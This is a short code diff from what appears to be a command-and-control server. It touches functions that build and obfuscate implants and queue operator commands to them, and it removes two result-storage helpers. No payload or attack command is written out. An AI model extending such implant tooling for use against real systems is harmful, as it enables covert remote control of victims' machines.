@@ -177,6 +177,7 @@ def build_implant(protocol):
     logger.info("building implant")
     rand_rng = secrets.SystemRandom()
     imp_id = rand_rng.randrange(1000,9999)
+
     match protocol:
         case "http":
             try:
@@ -249,16 +250,6 @@ def garble_implant(protocol):
             logger.error("no case match found")
 
 
-def add_user(new_user_id):
-    """
-    Adds a new user to the result storage dict
-    :param new_user_id: The users ID to add
-    :return: Nothing
-    """
-    logger.info(f"adding new user {new_user_id}")
-    result_storage.setdefault(new_user_id, [])
-
-
 def add_command(implant_id, operator, command):
     """
     Add a command to the implants queue
@@ -277,18 +268,6 @@ def add_command(implant_id, operator, command):
         queue = implant_command_queues.get(implant_id)
         queue.put((operator, command))
         logger.info(f"Added command for implant {implant_id}: {command}")
-
-
-def get_results(user_id):
-    """
-    Get the users result storage
-    :param user_id: The user ID to get the storage for
-    :return: The results if any
-    """
-    fetched = str(result_storage.get(user_id, []))
-    logger.info(f"got results {fetched}")
-    result_storage.pop(user_id, 0)
-    return fetched
 
 
 def get_results_by_implant(user_id, implant_id):
